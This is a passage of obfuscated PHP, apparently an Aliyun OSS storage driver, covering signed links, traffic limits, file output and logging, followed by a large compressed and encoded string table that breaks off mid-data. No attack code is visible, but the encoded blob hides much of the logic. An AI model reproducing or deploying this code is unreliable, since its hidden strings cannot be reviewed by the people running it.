$Ä³ãõÙ[1643] && $this->isUploadServer() || $ùíš¾ıæ == $Ä³ãõÙ[110] && $this->isFileOutServer()) { return $ï÷Ôå·º; } $“Öë‡¬ó = floatval($GLOBALS[$Ä³ãõÙ[6]][$Ä³ãõÙ[92]][$Ä³ãõÙ[108]][$ùíš¾ıæ]) * 1024 * 1024 * 8; if (!$“Öë‡¬ó) { return $ï÷Ôå·º; } $“Öë‡¬ó = $“Öë‡¬ó < 819200 ? 819200 : ($“Öë‡¬ó > 838860800 ? 838860800 : $“Öë‡¬ó); if ($×ˆıüö) { $ï÷Ôå·º[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($“Öë‡¬ó); } else { if (!isset($ï÷Ôå·º[OSS\OssClient::OSS_HEADERS])) { $ï÷Ôå·º[OSS\OssClient::OSS_HEADERS] = array(); } $ï÷Ôå·º[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($“Öë‡¬ó); } return $ï÷Ôå·º; } public function link($ĞŸáÍ™ò, $š‡ëÁ‚ï = array()) { $²á˜™™Ä =& $_SERVER[áäÒ½¯Ç]; if (!$this->exist($ĞŸáÍ™ò) || $this->isFolder($ĞŸáÍ™ò)) { return !1; } try { $š‡ëÁ‚ï = $this->trafficLimit($²á˜™™Ä[110], $š‡ëÁ‚ï, !0); $şŸ˜ÁÍ· = $this->client->signUrl($this->bucket, $this->pathEncode($ĞŸáÍ™ò), 3600 * 12, $²á˜™™Ä[1555], $š‡ëÁ‚ï); return $this->getCdnLink($şŸ˜ÁÍ·); } catch (OSS\Core\OssException $Ì¶ûİù) { $this->writeLog(__FUNCTION__ . $²á˜™™Ä[213] . $Ì¶ûİù->getMessage()); return !1; } } public function fileOut($í»®ñÛ¨, $ê˜æò÷ = false, $ÕÚâ‘Êó = false, $Û™ğÊ¦³ = '') { $âùì¡­¸ =& $_SERVER[áäÒ½¯Ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($í»®ñÛ¨, $ê˜æò÷, $ÕÚâ‘Êó, $Û™ğÊ¦³); } if (!$ÕÚâ‘Êó) { $ÕÚâ‘Êó = $this->pathThis($í»®ñÛ¨); } $ÕÚâ‘Êó = rawurlencode($ÕÚâ‘Êó); $›ŸìÂë¼ = get_file_mime(get_path_ext($ÕÚâ‘Êó)); if ($›ŸìÂë¼ == $âùì¡­¸[259]) { return parent::fileOut($í»®ñÛ¨, $ê˜æò÷, $ÕÚâ‘Êó, $Û™ğÊ¦³); } $ê˜æò÷ = $ê˜æò÷ ? $âùì¡­¸[1652] : $âùì¡­¸[1653]; $÷£Ã‚¹ = array(OSS\OssClient::OSS_SUB_RESOURCE => $âùì¡­¸[1654] . rawurlencode("{$ê˜æò÷}\73\x66\x69\x6c\x65\156\x61\155\145\75{$ÕÚâ‘Êó}")); $ß½Ù“Ëû = $this->link($í»®ñÛ¨, $÷£Ã‚¹); $this->fileOutLink($ß½Ù“Ëû); } public function fileOutServer($“æèß¤±, $àòùùı” = false, $â…Ô¦Ä = false, $›à„¸ƒ = '') { parent::fileOut($“æèß¤±, $àòùùı”, $â…Ô¦Ä, $›à„¸ƒ); } public function fileOutImage($Åãœ÷“, $ë·™ª‚Ş = 250) { if ($this->size($Åãœ÷“) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Åãœ÷“, $ë·™ª‚Ş); } $èÃşá² = array(OSS\OssClient::OSS_PROCESS => $_SERVER[áäÒ½¯Ç][1617] . $ë·™ª‚Ş); $ˆ³¡Åø¥ = $this->link($Åãœ÷“, $èÃşá²); $this->fileOutLink($ˆ³¡Åø¥); } public function fileOutImageServer($Şº‡º­, $õ¹ö•àÔ = 250) { parent::fileOutImage($Şº‡º­, $õ¹ö•àÔ); } public function fileOutLink($ªÑÎí æ) { $ÍÜÌÉşì =& $_SERVER[áäÒ½¯Ç]; if (!$this->isCdnHost() && substr($ªÑÎí æ, 0, 7) == $ÍÜÌÉşì[227]) { $ªÑÎí æ = $ÍÜÌÉşì[228] . substr($ªÑÎí æ, 7); } header($ÍÜÌÉşì[173] . $ªÑÎí æ); die; } public function hashMd5($™–Îõ¶Û, $”Òœµ¶Ø = '') { $œÉ‘ƒüÉ =& $_SERVER[áäÒ½¯Ç]; $õç§Ş‰ = $this->_objectMeta($™–Îõ¶Û); if (!$õç§Ş‰) { return $œÉ‘ƒüÉ[12]; } if (!isset($õç§Ş‰[$œÉ‘ƒüÉ[1637]]) && !empty($”Òœµ¶Ø)) { $şğ­¯…á = $this->updateObjMeta($™–Îõ¶Û, array($œÉ‘ƒüÉ[1637] => $”Òœµ¶Ø)); $õç§Ş‰[$œÉ‘ƒüÉ[1637]] = $şğ­¯…á ? $”Òœµ¶Ø : $œÉ‘ƒüÉ[12]; } return isset($õç§Ş‰[$œÉ‘ƒüÉ[1637]]) ? strtolower($õç§Ş‰[$œÉ‘ƒüÉ[1637]]) : $œÉ‘ƒüÉ[12]; } public function size($¬Ç¤ÍÒÌ) { $Éİçò½÷ = $this->objectMeta($¬Ç¤ÍÒÌ); return $Éİçò½÷ ? $Éİçò½÷[$_SERVER[áäÒ½¯Ç][79]] : 0; } public function info($¿÷ô¹ê) { if ($this->isFolder($¿÷ô¹ê)) { return $this->folderInfo($¿÷ô¹ê); } else { if ($this->isFile($¿÷ô¹ê)) { return $this->fileInfo($¿÷ô¹ê); } } return !1; } public function exist($İ¦ñ¤õ) { return $this->isFile($İ¦ñ¤õ) || $this->isFolder($İ¦ñ¤õ); } public function isFile($ÏôÀŠıÌ) { return !$this->isFolder($ÏôÀŠıÌ) && $this->objectMeta($ÏôÀŠıÌ); } public function isFolder($ÆÓ·òÂ) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][178], $ÆÓ·òÂ); } protected function objectMeta($Ø…ú’ş ) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][180], $Ø…ú’ş ); } protected function _objectMeta($¬Ãİş¦æ) { $ÖûšŒ¢ƒ =& $_SERVER[áäÒ½¯Ç]; try { $°ÖÛ§Ä = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¬Ãİş¦æ)); } catch (OSS\Core\OssException $âçÈ‡µ¿) { $this->writeLog(__FUNCTION__ . $ÖûšŒ¢ƒ[213] . $âçÈ‡µ¿->getMessage()); $°ÖÛ§Ä = !1; } if ($°ÖÛ§Ä) { $°ÖÛ§Ä[$ÖûšŒ¢ƒ[79]] = intval($°ÖÛ§Ä[$ÖûšŒ¢ƒ[1635]]); } return $°ÖÛ§Ä; } protected function _isFolder($ñÇ×”¸€) { $ğñ¾¿‡ =& $_SERVER[áäÒ½¯Ç]; if ($ñÇ×”¸€ == $ğñ¾¿‡[12] || $ñÇ×”¸€ == $ğñ¾¿‡[8]) { return !0; } $Å³ˆéÁ = array($ğñ¾¿‡[1630] => $ğñ¾¿‡[8], $ğñ¾¿‡[1631] => rtrim($ñÇ×”¸€, $ğñ¾¿‡[8]) . $ğñ¾¿‡[8], $ğñ¾¿‡[1632] => 1, $ğñ¾¿‡[1633] => $ğñ¾¿‡[12]); $ÛÈÛ›¬« = $this->client->listObjects($this->bucket, $Å³ˆéÁ); if ($ÛÈÛ›¬«->getObjectList() || $ÛÈÛ›¬«->getPrefixList()) { return !0; } return !1; } public function writeLog($¿¬‘ÚÜ¾ = '', $¾ÍÑì‡Ş = false) { $¡äæİç =& $_SERVER[áäÒ½¯Ç]; $›»‘á²‚ = in_array(ACTION, array($¡äæİç[211], $¡äæİç[212])); if (!$›»‘á²‚ && !GLOBAL_DEBUG) { return; } $Õ´ûö×Õ = 0; if (stripos($¿¬‘ÚÜ¾, $¡äæİç[1655]) !== !1) { $Õ´ûö×Õ = 1; $Š«˜¯Æñ = explode($¡äæİç[1656], $¿¬‘ÚÜ¾); $¿¬‘ÚÜ¾ = !empty($Š«˜¯Æñ[1]) ? $Š«˜¯Æñ[1] : $¿¬‘ÚÜ¾; } else { if (stripos($¿¬‘ÚÜ¾, $¡äæİç[1657])) { $Õ´ûö×Õ = 2; $Š«˜¯Æñ = explode($¡äæİç[1657], $¿¬‘ÚÜ¾); $Š«˜¯Æñ = explode($¡äæİç[4], $Š«˜¯Æñ[0]); $¿¬‘ÚÜ¾ = !empty($Š«˜¯Æñ[1]) ? $Š«˜¯Æñ[1] : $¿¬‘ÚÜ¾; } } if ($›»‘á²‚ && I18n::getType() == $¡äæİç[1658]) { if ($Õ´ûö×Õ == 1) { $¿¬‘ÚÜ¾ = str_replace($¡äæİç[1659], $¡äæİç[1660], $¿¬‘ÚÜ¾); } else { if ($Õ´ûö×Õ == 2) { $Š«˜¯Æñ = explode($¡äæİç[213], $Š«˜¯Æñ[0]); $”ÅÍ”„ı = isset($Š«˜¯Æñ[1]) ? $Š«˜¯Æñ[1] : $¡äæİç[12]; $¼’Ì„ÇÀ = array($¡äæİç[1661] => $¡äæİç[1662], $¡äæİç[1663] => $¡äæİç[1664], $¡äæİç[1665] => $¡äæİç[1666], $¡äæİç[1667] => $¡äæİç[1668], $¡äæİç[1669] => $¡äæİç[1670], $¡äæİç[1671] => $¡äæİç[1672], $¡äæİç[1673] => $¡äæİç[1674], $¡äæİç[1675] => $¡äæİç[1676], $¡äæİç[1677] => $¡äæİç[1678], $¡äæİç[1679] => $¡äæİç[1680]); if (isset($¼’Ì„ÇÀ[$”ÅÍ”„ı])) { $¿¬‘ÚÜ¾ = $¼’Ì„ÇÀ[$”ÅÍ”„ı]; } } } if (stripos($¿¬‘ÚÜ¾, $¡äæİç[1681])) { $¿¬‘ÚÜ¾ = $¡äæİç[1682]; } } if (!trim($¿¬‘ÚÜ¾)) { return; } parent::writeLog(trim($¿¬‘ÚÜ¾), $¾ÍÑì‡Ş); } } goto Eíå‚Å®åµ; AÔÉîÇäàä: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xe1\xe4\xd2\xbd\xaf\xc7", base64_decode('kaSfj5Wg')); $_SERVER[áäÒ½¯Ç] = explode("\174\4\174\5\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\171\174\33\325\265\60\133\51\241\145\151\13\17\372\150\141\60\11\266\23\55\266\263\220\70\161\22\331\226\143\21\131\62\222\234\5\333\114\306\322\310\232\130"."\xd2\x28\x9a\x91\xb7\x24\x2d\x4\x12\x96\x90\x4\xa\x81\xb0\xb4\xec\x14\xda\x42\x68\x21\x4\x8\xcb\xa3\x65\x69\x1f\x50\x5a\x96\x3e\x96\x52\x5a\x88\x9d\x84\xb5\x40\x59\x5a\x96\x7e\x77\x39\x77\x99\x91\xc\xef\xfb\x7d\x7f"."\174\371\45\321\335\347\336\163\317\75\367\334\163\317\71\367\57\67\136\163\375\137\357\135\163\320\232\257\255\71\350\221\147\57\177\345\367\27\322\360\232\3\310\377\44\174\302\306\103\366\43\177\276\263\361".base64_decode('gpqa9lmHTot8c8tdt2k/027Tzo+Gn3gydNjvf3FqcPyGJ0bG99/voUI414gK07qN9EfJm7aiDw==')."\33\226\155\321\204\244\231\117\33\375\64\154\344\351\257\237\376\164\305\302\105\75\147\332\72\215\372\350\217\12\375\42\377\133\253\262\6\313\127\43\321\204\32\357\352\354\14\306\22\120\250\121\316\317\231"."\x29\x8\x15\xb4\xa2\x96\x83\xef\x17\xf4\xa2\x85\x7a\x23\x37\xa7\x16\xcc\x82\x9e\x77\xa4\x88\x84\x94\x66\x6b\x7d\x9a\x5\x2d\xb5\x36\xab\xad\xc1\xce\x70\x74\xb9\x9a\x58\xde\x19\x84\x12\x7d\xea\xaa\x92\x5e\x1c\xa1\x31\x12"."\x8c\xdb\x5a\xd1\x4e\x18\x39\x9d\x97\x18\x2a\xf2\x7e\x35\x7\x17\x85\x22\x4a\x22\x16\x88\xc4\x3\x2d\x89\x50\x34\x42\x93\x5b\xa2\x1d\x1d\xa1\x44\x79\x7a\x2c\x1a\xe\x37\x7\x5a\x16\x97\xe7\x74\xc6\x2\x8b\x3a\x2\xa\xea"."\x5f\x56\x57\x8d\x7c\xda\xac\x51\x56\xd0\x9c\x15\x4a\x2d\xd\xb4\x19\x7a\x36\x45\x83\x79\x8d\x75\xc7\x1e\x29\x40\x28\xc1\x43\x68\x9a\xf2\xa5\x6c\x96\x46\x22\x3c\x94\xd2\xd3\x5a\x29\xb\xd0\x6a\x95\x23\x85\xa2\x91\xd3\xd8"."\240\27\353\43\74\225\6\264\222\155\32\371\44\215\4\207\355\242\46\322\121\137\223\150\242\365\74\64\25\17\206\203\55\11\5\167\120\151\213\105\73\24\230\204\234\146\331\172\121\131\332\36\214\5\25"."\xdc\xe9\xa6\x6a\x32\xd6\x6a\x5\xf0\x25\x82\x40\xa1\x4\xc2\x61\x65\xa2\x16\x6c\x3d\x57\x60\xcd\xd0\x3a\x15\x1a\x8b\xc6\x5a\x83\x31\xa5\x79\xb9\x22\x20\x94\x34\x73\x39\x33\xef\x43\xad\xa0\x99\xb4\xa5\xae\x6\x63\x31\x1a".base64_decode('8AB6h0N40iASbWuLB3kMBndaGPVkOuCnI5ZKZ211UMuWGJoO0N9q+IFf0wLUXWXkjRKgKTRhmg==')."\x7c\x59\x41\xa0\xc4\x4a\xeb\x2c\x45\x4f\x41\x20\x87\xea\x9b\x50\xaf\xf\xd2\xfa\x58\xa9\x95\x2c\x60\xa0\x15\x3a\x48\x83\x4d\xf3\xe9\xef\x5c\xa8\xdf\xa7\xe2\x3c\xbd\x68\xab\x7a\x3e\x69\xa6\x8c\x3c\xac\xe3\x5\x80\x8f\x9a"."\x9d\x69\x2d\x1a\xa8\x0\x8d\xa7\xcd\x6c\x8a\x85\x2d\x63\x14\x46\x99\x36\xb2\x7a\xa4\x94\x93\x8b\xf0\x68\x32\x63\x64\x53\x45\xb6\xf4\xbe\xac\x24\x8d\x86\xf9\x4a\xc6\x65\x45\xac\x80\x7a\xc2\x89\x80\x91\x1e\x11\x4b\x11\x97"."\353\344\271\226\131\52\46\365\20\132\72\64\136\17\311\272\155\243\301\61\200\230\135\205\254\251\245\342\172\221\17\315\60\333\120\103\321\222\55\47\16\260\125\220\222\200\340\257\351\76\313\373\105\157\367"."\102\364\137\55\20\272\36\370\114\106\317\146\125\175\130\207\145\222\113\315\264\330\370\374\126\237\221\367\243\24\32\15\105\325\214\146\145\72\122\63\125\122\213\321\317\224\76\354\53\144\12\260\206\371\262"."\xed\x71\xa0\x31\x86\x46\xc4\xb4\x83\x12\x15\xce\x9a\x49\xd\xca\x96\xc8\xe0\x68\x38\x63\xdb\x85\xb8\x9e\x4f\xe1\xc1\xc1\x50\xcc\xa1\x3c\x19\x7c\x41\xd7\xa1\x50\xab\x47\x49\x29\x1d\xca\x72\xa5\xbd\xd1\x68\xb4\x58\xc5\x5c".base64_decode('lofY6HiaxRPtYTZDqTQgINsEquCDhkXomViMWqGQNZKabZh5v5m0ddtr2UVdgxYDyaRuWd4WMw==').base64_decode('bxfNrDeQzZpD3mjR6DfyjcpUIK0oEy1hLyZ3jbAuq+YqGBfwZ6Y2ley0dzZbb7x0Uctbab3oDQ==').base64_decode('ArI3KqiznOaxYq2GVTAtA3evUdFsW0tmML0QzTd9SXkjnzXyenlZ1Iju7Sxq/TmtUSmU+hAAYA==')."\x8d\x41\x5a\x12\x97\x90\xb\x3\x0\x1a\x95\x9c\x36\xec\xd5\xfa\x59\x4b\xc1\xe1\x82\x51\xd4\x2d\x36\x6a\x65\x51\x47\x2\x30\x2a\xed\xed\xc0\x6b\xc3\xd0\x53\xde\x38\x22\xc8\xd0\xd8\xf4\xba\x19\xa\xc2\x15\x85\xe5\xd1\xd4"."\366\104\242\123\15\265\241\35\67\22\124\73\2\211\226\166\150\335\326\372\131\323\141\104\146\171\223\54\161\231\27\255\21\214\115\21\64\70\221\330\151\16\351\105\364\341\346\221\106\145\300\114\365\231\303"."\76\226\205\13\307\21\261\140\205\361\374\26\154\157\114\313\367\343\141\364\215\330\272\345\46\67\315\150\177\366\245\351\202\364\365\351\151\263\10\243\261\6\373\235\300\17\353\371\176\73\303\332\216\7\143"."\113\202\61\65\36\155\113\54\15\304\202\260\212\20\346\14\263\336\340\257\147\275\61\75\205\200\230\264\131\75\255\40\240\277\314\213\27\14\376\70\313\305\213\210\345\205\103\213\60\354\132\275\26\52\344".base64_decode('lUuxtsNGzsDDs3kOATba6xdBh/xkzE091tSantS0Wi/6f2ptd0+rb2rvAr8h6vjrffVKQ90spQ==')."\23\61\37\206\226\125\140\320\145\45\352\224\350\142\47\130\4\206\347\315\274\136\161\141\41\104\62\55\335\333\256\153\210\356\242\211\160\314\213\207\175\213\306\277\4\272\170\373\223\150\211\153\136\150\142".strrev('Àäôdµtˆsz€e\'¼‚m,>¬ĞòéØ-yŒseı&UP€?t+hö‰‚;P0WZx,').base64_decode('BHkoBKMxKV1iU9dNf3oBm3vpj6q2hIOBmApMqmpYbdLOiKOc3Kpm30qEaB26rYkBoM+FcmhJiw==')."\201\250\316\155\214\215\262\103\40\76\132\101\113\215\24\337\347\120\264\135\67\372\63\320\157\3\67\227\64\263\146\121\313\342\255\200\261\246\375\6\120\345\102\266\204\226\201\37\67\234\310\224\162\175\260"."\161\41\220\365\353\266\340\32\255\21\304\132\345\330\236\213\66\156\73\324\352\330\131\41\346\127\61\352\366\370\12\371\376\332\311\320\226\332\60\263\16\47\300\254\302\310\20\373\314\330\41\171\350\276\244"."\211\326\171\207\66\240\67\342\261\0\161\233\113\122\131\104\242\237\163\361\226\327\344\46\23\170\266\262\276\34\152\204\264\331\142\362\115\232\36\120\346\72\267\74\105\57\26\315\342\211\120\202\204\25\262".base64_decode('b+LpgsZtzlhYiCKwcMbkjIjJcLPRD+Oe0tAGVCSFGDKfZaNJQAPUUqlKyYjyQANrGNqSDIChlg==')."\346\250\203\103\202\313\242\71\230\220\206\44\156\112\105\263\247\302\52\0\52\332\34\210\207\132\324\316\100\242\235\357\266\176\53\65\140\371\265\42\342\306\6\21\123\325\347\307\254\10\76\7\371\370\146"."\x7d\x28\xfd\x99\x1\xeb\xa\xaf\x15\x55\xeb\x43\x83\x65\xb\xbb\x84\x37\xb6\x1\xc6\xbc\xf8\xe3\xd3\xd1\x5f\xc1\xa9\xa4\xcc\x9c\xc6\x9a\xc2\xe4\x92\x3\x7\x47\x2c\x1e\x23\x9b\xb9\x9e\xa2\xbb\xb9\x23\x89\x92\x21\x9a\x34".base64_decode('lQGmaJs4s+goiZZSxoROodHDtJT4/LCZSulZnS2DjM4YojoohvCHLxIBcnSKQamCuTSsGKqJ2Q==')."\27\26\137\212\217\175\42\1\363\160\60\77\42\230\105\270\27\45\313\136\304\73\213\172\332\30\146\4\157\330\356\320\212\3\154\140\250\246\40\30\70\42\21\223\266\256\160\130\155\211\106\22\350\324\110"."\123\226\306\102\211\40\243\253\201\126\65\320\322\11\61\101\251\71\233\51\63\112\64\145\260\1\20\35\165\302\57\70\72\304\122\24\314\74\332\17\0\231\274\342\114\131\226\225\22\14\17\240\230\140\222"."\134\174\17\342\134\162\243\336\34\242\176\136\336\247\316\56\340\130\30\126\60\176\274\171\244\315\54\62\146\323\350\317\57\341\63\277\64\76\303\333\336\21\150\361\306\333\3\15\63\147\321\324\345\271\124"."\x4f\xa2\xdd\xb0\x7a\x4e\xe7\x71\xe8\xce\x90\x35\x43\x2d\xea\x88\xf2\x30\x5c\x68\xa8\xab\x67\x74\x1\x71\x4f\x9a\xe8\xf9\x72\x6f\xce\x8b\x5b\xc1\x8c\xaf\xaf\xae\xae\x8e\xb5\x35\x6d\x96\x92\x41\x4\x8f\xef\x32\x29\x32\x5a"."\x76\xc4\x2a\x25\x7\x74\x79\xd3\xb1\xbc\x43\x6\xa3\xcc\x93\xf9\xa1\x61\x72\x39\xf0\xad\x12\xd9\x83\x55\x2d\x89\x9b\x53\x51\x65\xbb\x64\xc9\x90\x42\x8\x98\x42\x55\xc\xc6\xcb\xd3\x54\x2d\xdb\x6f\x22\xbc\xcb\xe4\xe4\xc4"."\24\307\137\32\327\51\143\10\37\312\150\34\116\30\172\154\161\40\266\163\104\256\204\301\214\372\300\166\31\347\111\100\111\124\6\64\75\140\204\0\332\242\37\5\274\377\242\275\205\115\333\311\360\375\22".strrev('eEôŞm4&ò‹]Z;ø'."\0".'NvœåSárŠ°ÓQ€	€>§—8k|8Ñé#ÖûTcE°Z')."\xcb\x90\xcc\x7c\x53\x75\xbd\xaf\xae\x5a\x61\x67\xe1\xa6\xea\xae\x44\x1b\x3a\x46\x2c\x98\x7f\xe8\xbc\x16\x33\x57\xc0\xf4\xa4\xa3\x94\xb5\xd\x3c\x50\x8a\xb2\xf3\x81\x6e\xce\xc3\x2c\x1a\x8b\x74\xba\xe0\x10\x4c\x68\xb0\x29"."\316\363\313\345\346\371\47\152\25\206\202\371\306\145\152\147\70\220\150\213\306\72\70\71\27\370\124\110\126\132\146\136\101\212\112\226\127\307\154\74\240\277\226\314\272\160\123\206\305\262\212\50\270\254\22"."\12\56\163\241\340\262\162\24\134\126\11\301\6\1\23\265\234\66\152\346\321\102\105\174\100\316\227\4\264\110\264\207\42\213\325\216\150\153\60\254\206\42\210\335\114\224\247\167\165\266\6\30\375\223\323"."\233\243\154\303\203\324\56\304\160\56\11\204\103\356\342\301\145\241\170\42\136\61\13\245\165\5\135\71\255\315\152\147\54\330\26\132\306\243\155\241\140\270\65\256\266\4\132\332\105\231\110\240\3\42\210".base64_decode('ldOzKcvvLK8izjnOBX0qIBzb2mXZmsqkRqogwegUpsN0wHCxqJSMRGU0qsT5YCZyyLE9Fp0gAQ==')."\354\354\370\124\103\177\152\225\100\134\261\13\52\337\115\373\106\170\220\14\203\305\125\306\353\42\156\11\72\242\0\73\137\326\25\25\227\151\226\16\155\225\23\2\151\233\163\314\256\70\332\104\104\36\232"."\212\0\21\316\42\224\40\123\3\237\61\320\226\124\264\3\254\73\151\41\30\125\243\235\301\130\0\213\125\325\245\261\150\144\21\124\30\312\350\254\3\41\230\207\32\166\212\6\351\252\55\166\166\55\153"."\x68\x4c\xcc\x26\xa0\xbf\xd2\x64\x30\x45\x9c\x13\x3b\x9b\xe4\x19\xc0\xfb\x30\x5b\xc3\x38\x72\x16\x48\xa3\x15\xcd\x58\x12\xb3\xc4\xdb\xef\x33\x4d\x68\x33\x8b\xf\x8c\xd0\xbc\xc5\x70\x62\x98\x6d\xcc\xd3\xf8\xc6\x5\x98\x1a"."\135\34\214\250\14\221\150\114\102\76\232\20\214\305\242\61\30\266\155\16\60\371\33\315\214\5\343\301\4\333\332\127\225\14\6\24\277\157\32\40\255\216\230\71\370\274\377\214\236\241\151\65\335\336\151"."\xbe\x5e\x14\xa8\x9d\xba\x90\x46\x21\xd6\xe3\x73\x44\xd9\x49\xa0\x54\xe4\xb5\x31\xff\x57\x63\x2d\xa8\x6d\xec\xf1\xf7\xf8\x6b\x16\x34\x76\x7\xbc\xa3\x9a\x77\xb4\xce\x3b\xc7\xdb\x8b\xce\xf\xb5\xd3\x20\xa1\x77\x75\x83\x67"."\306\132\134\0\25\134\160\122\57\372\151\352\131\60\245\307\173\362\17\126\54\354\356\351\255\156\234\166\142\217\357\244\236\241\336\251\265\13\330\167\222\245\42\72\242\260\35\15\165\65\65\255\6\165\11"."\235\251\171\221\274\104\207\111\1\226\61\152\24\104\352\352\131\153\131\72\232\67\275\137\324\350\366\366\114\353\135\40\325\223\222\334\337\102\244\24\261\172\31\136\56\340\75\35\217\214\127\305\313\34\160"."\242\224\117\212\335\20\143\177\237\306\17\247\375\171\161\352\263\213\134\46\73\210\60\122\20\334\325\123\350\357\132\66\221\375\372\60\243\4\371\264\301\330\250\122\336\130\305\216\137\171\175\25\4\114\233".strrev('ÃšMUB4¸ô©+iA&`SÚñ‰>*'."\n".'2dr8ÚHƒM¥eŠK(mƒ#ºP=én±c').strrev('WÍ4¦ßU°G §4ø'."\n".'•e‰rFÀG§òÈU•ZÛëªDh¤@A44›ó6„âËÂ¬~A').base64_decode('KMihnipPQIGf0rAYVhcLHdMh6FNBzJCFzh/sBOCv6ekpdeup3m6E+Jo33bt6+tpaJurx96A/LA==')."\22\250\160\235\242\152\66\3\11\247\176\352\242\140\302\207\173\304\5\350\216\10\317\246\121\263\310\17\24\5\207\334\301\66\155\55\353\150\42\201\123\30\141\142\254\24\310\235\351\274\207\5\275\302\34"."\x87\x74\x23\x45\xc8\x67\x84\xcb\x79\x39\x27\x2c\x5d\x89\xe0\x1a\x71\xdd\xf6\xf1\x12\x1e\x29\x53\x45\x71\x99\x58\xf3\x5b\x28\x12\x5b\x22\xa\x92\x3a\x40\x9d\x15\xf4\x67\x69\x7b\x30\xc2\x48\x79\x42\xa\x37\x29\x2d\x81\x78"."\x90\xc5\x80\xed\x3a\x34\x18\x69\x85\xdb\x1e\xfa\x3f\x30\xa1\x50\x6c\xee\xa1\x6c\x43\xc9\xa3\xc5\xdc\x22\xed\xab\xf4\x12\x21\x4e\x44\x24\x8e\xab\x33\x4b\xc7\x67\xeb\xb6\x52\x36\x6b\x73\x41\x55\xd6\x18\x80\xce\xc2\x4a\x85"."\x9b\x3c\x2f\x7c\x6c\x5a\xa5\xaa\xe8\xfc\xc3\xe4\xb6\x53\x41\x7c\x5e\x35\xb5\x52\xc1\x50\x3e\x6f\xa6\xfa\x64\x44\x17\x3b\xfa\xa2\x0\xe2\x9d\x12\x4a\xd\xbb\x75\x52\x42\x11\xa5\x39\x1a\xd\x7\x3\x11\x5\x33\xf\xb0\xd7".base64_decode('Ic4kHuwMoI0SS4DjiSBchBkwmaFWL2t/mZfJfXjALNATjG6rWZORLqfECB8DPVhu48GMjAf12g==').strrev('aë=Aõ„îĞñV|`ÎÁu‹$ä÷ÎJÕ†=Z†*Bì\\à{'."\0".'?'."\0".'‘¡ ÏËˆöÈqÅƒ')."\342\53\17\353\243\207\11\355\74\104\330\326\12\335\352\102\213\31\272\105\202\210\146\147\74\30\151\361\232\361\210\353\45\217\71\224\327\213\244\10\200\115\210\6\74\102\154\340\351\57\232\245\102\47\373".strrev('Ë^ ‹i«¡e8|ùVLWÒ‡*ÎàîïàCG•œYµ°½ Y€äÃÛM3gÑ‚İ£¦')."\366\130\107\31\42\223\344\254\56\6\270\10\111\153\36\17\240\115\203\213\114\332\254\34\146\130\307\166\66\206\306\342\332\111\334\41\12\306\332\55\360\161\337\56\342\217\242\323\133\134\372\234\255\365\263".strrev('è„$a½_Xê3æô2¨1&“¡ÂO™1Ê³ÊúÂTådúc9K’U©…$OLpÒŠvÏÉao')."\105\13\202\151\241\235\305\304\76\216\66\321\266\54\3\103\203\234\15\144\336\343\214\341\345\344\43\44\234\334\320\307\271\110\65\34\154\113\50\247\106\21\275\62\114\225\326\121\161\141\205\374\147\346\25"."\107\333\14\134\210\312\223\26\171\134\313\247\150\312\12\264\237\254\150\252\142\37\251\162\124\27\210\341\354\204\207\105\225\162\124\303\340\226\201\200\21\200\14\137\354\201\54\51\52\266\334\22\160\232\232".base64_decode('BUc8LJCGkM7SxNTKmCgRGJHA+uX4Lo6KVcRQQsEf8Ei8ESYiXrEepKgT5C6MdG3UGESdRn7EyA==')."\307\15\54\301\160\247\302\302\46\135\350\324\54\153\10\61\40\260\357\115\235\72\125\21\254\200\340\104\360\152\27\61\212\264\23\205\351\256\202\245\34\364\363\36\270\112\367\140\21\265\264\143\13\251\52".base64_decode('GhwRl+cc9zDlA4OGpCICQLDAYUFktKKANSNLmDbwMVi4iIhKxdLaoOCSHHUk4mLZI6z3ctDZKA==')."\x8d\xb6\x7a\xc8\x6f\x3b\xea\xbc\xa7\x84\x7a\x49\xe8\x71\x18\xc1\x2\xfd\x90\x8e\x26\x4c\x41\xda\x69\xa0\x93\xec\xcb\x68\x7d\xa3\x2c\xba\x97\x5b\x13\x10\x2\x3c\x31\x58\x24\x27\x6f\x7e\xf4\x73\x46\x8a\x43\x20\xcc\xef\x6".strrev('t·À8¡“ IÁæIT``0‘†£tˆÃî\'xÊ ˆèR1Ÿ˜âKG¤°e™Ñ¼8.'."\n".'ÕÄè<')."\102\311\242\35\264\350\303\253\164\21\336\7\31\330\51\201\225\277\36\327\21\74\240\171\321\102\274\54\117\56\55\104\227\170\213\21\133\22\277\257\344\213\134\114\241\130\321\375\242\103\170\26\325\362\176"."\xe0\xb9\xa8\x1c\x6f\x2b\x9a\x9c\x89\xe7\xdc\x84\xbb\x50\xb\x39\x2f\x73\x95\x1a\x17\x7\x20\xc1\xc3\xc1\xb5\x94\x25\x49\x75\xdc\xfc\x8b\x2b\xd5\x15\xc5\x3c\x4d\x85\xad\xe\xba\x49\xae\xc9\x8a\x74\xb3\xf4\xa1\xd3\x4f\x9".base64_decode('EKpOYu0EhVtNryphc13rml/bNNGRuugroi+KjkjUFWgPUaWJa2ldZkgcmYFCQXSbt2+hKtIO4g==')."\344\310\130\233\361\202\306\66\16\305\253\270\132\320\12\5\371\233\234\235\144\10\117\16\134\45\236\240\300\115\64\35\265\30\22\357\53\315\10\163\136\34\23\257\140\312\260\161\12\136\307\46\273\41\23"."\x5\xc5\xf6\xee\xae\x2c\xe2\xf2\x7e\x43\xb6\xcd\x32\xb4\x11\x7\x1d\xcf\x14\x47\xc9\x4a\xcc\x8d\x6f\x2a\xe1\x47\x7c\x82\x17\xab\xac\x53\x96\x34\xb\xec\xe8\x57\x94\xf4\x3f\x7\x75\x29\x11\x5f\xa9\x16\x44\x8e\x14\xa5\xd9"."\x52\x96\x68\x54\x2a\xc5\xa7\x82\xf4\x8\xad\xcc\x14\xe1\xe0\x5\x14\x48\x59\xa8\x4b\x84